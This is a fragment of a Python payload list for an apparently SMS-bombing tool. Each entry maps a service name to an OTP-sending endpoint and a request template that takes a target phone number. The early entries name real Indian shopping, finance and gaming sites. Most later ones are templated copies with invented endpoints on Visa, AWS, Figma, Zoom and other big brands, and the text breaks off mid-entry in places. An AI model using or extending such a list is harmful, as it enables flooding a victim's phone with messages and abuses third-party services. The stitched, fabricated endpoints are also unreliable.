        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobilenumber={phone}&otptype=register"
    },
    {
        "name": "MyImagineStore",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'
    },

    # NEW APIS FROM YOUR HUGE LIST (400+)
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Tata Capital Business",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
    },
    {
        "name": "DealShare",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'
    },
    {
        "name": "Snapmint",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Housing.com",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "RentoMojo",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Netmeds",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "PenPencil V3",
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Entri",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
    },
    {
        "name": "Revv",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'
    },
    {
        "name": "DeHaat",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'
    },
    {
        "name": "A23 Games",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
    },
    {
        "name": "Spencer's",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "PayMe India",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'
    },
    {
        "name": "Shopper's Stop",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "Hyuga Auth",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "BigCash",
        "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        "method": "GET",
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "data": None
    },
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
    },
    {
        "name": "WorkIndia",
        "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "PokerBaazi",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle",
        "url": "https://www.m
    {
        "name": "PharmEasy SMS",
        "type": "SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    # 90
{
    'name': 'RuPay_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rupay.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 91
{
    'name': 'Visa_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.visa.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 92
{
    'name': 'Mastercard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mastercard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 93
{
    'name': 'AmericanExpress_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.americanexpress.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Discover_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.discover.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 95
{
    'name': 'DinersClub_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dinersclub.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 96
{
    'name': 'Google_Cloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://cloud.google.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 97
{
    'name': 'AWS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://aws.amazon.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 98
{
    'name': 'Azure_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://azure.microsoft.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 99
{
    'name': 'Oracle_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.oracle.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 100
{
    'name': 'IBM_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ibm.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 101
{
    'name': 'SAP_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sap.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 102
{
    'name': 'Salesforce_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.salesforce.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 103
{
    'name': 'HubSpot_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hubspot.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 104
{
    'name': 'Zoho_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zoho.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 105
{
    'name': 'Freshworks_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.freshworks.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'ServiceNow_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.servicenow.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 107
{
    'name': 'Atlassian_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.atlassian.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 108
{
    'name': 'Slack_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.slack.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 109
{
    'name': 'Zoom_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zoom.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 110
{
    'name': 'Microsoft_Teams_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.teams.microsoft.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 111
{
    'name': 'Google_Meet_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.meet.google.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 112
{
    'name': 'Cisco_Webex_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.webex.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 113
{
    'name': 'Adobe_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.adobe.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Figma_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.figma.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 115
{
    'name': 'Canva_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.canva.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 116
{
    'name': 'Sketch_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sketch.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 117
{
    'name': 'InVision_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.invisionapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 118
{
    'name': 'Marvel_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.marvelapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 119
{
    'name': 'Proto.io_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.proto.io/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 120
{
    'name': 'UXPin_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.uxpin.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 121
{
    'name': 'Balsamiq_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.balsamiq.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 122
{
    'name': 'Axure_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.axure.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 123
{
    'name': 'MockFlow_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mockflow.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 124
{
    'name': 'Wireframe_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wireframe.cc/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 125
{
    'name': 'Mockplus_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mockplus.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 126
{
    'name': 'JustInMind_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.justinmind.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 127
{
    'name': 'Pidoco_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pidoco.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 128
{
    'name': 'HotGloo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hotgloo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 129
{
    'name': 'FluidUI_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fluidui.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 130
{
    'name': 'Framer_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.framer.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 131
{
    'name': 'Origami_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.origami.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Principle_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.principle.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 133
{
    'name': 'Keynote_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.keynote.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 134
{
    'name': 'PowerPoint_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.powerpoint.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 135
{
    'name': 'Google_Slides_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.slides.google.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 136
{
    'name': 'Prezi_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.prezi.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 137
{
    'name': 'SlideShare_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.slideshare.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 138
{
    'name': 'HaikuDeck_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.haikudeck.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 139
{
    'name': 'Emaze_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.emaze.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 140
{
    'name': 'Sway_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sway.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 141
{
    'name': 'Visme_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.visme.co/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 142
{
    'name': 'Beautiful.ai_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.beautiful.ai/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 143
{
    'name': 'Gamma_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gamma.app/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 144
{
    'name': 'Tome_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tome.app/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 145
{
    'name': 'Pitch_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pitch.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 146
{
    'name': 'Zight_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zight.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 147
{
    'name': 'Loom_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.loom.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 148
{
    'name': 'ScreenRec_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.screenrec.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 149
{
    'name': 'OBS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.obsproject.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 150
{
    'name': 'Streamlabs_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.streamlabs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
}
# 151
{
    'name': 'Twitch_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.twitch.tv/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 152
{
    'name': 'YouTube_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://www.youtube.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Reddit_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.reddit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 154
{
    'name': 'TikTok_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tiktok.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 155
{
    'name': 'Snapchat_Login_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://accounts.snapchat.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 156
{
    'name': 'Pinterest_SMS',
    'type': 'sms
    {
        "name": "Snitch SMS",
        "type": "SMS",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    # 255
{
    'name': 'Slack_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://slack.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 256
{
    'name': 'Teams_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://teams.microsoft.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 257
{
    'name': 'Zoom_Web_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://zoom.us/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
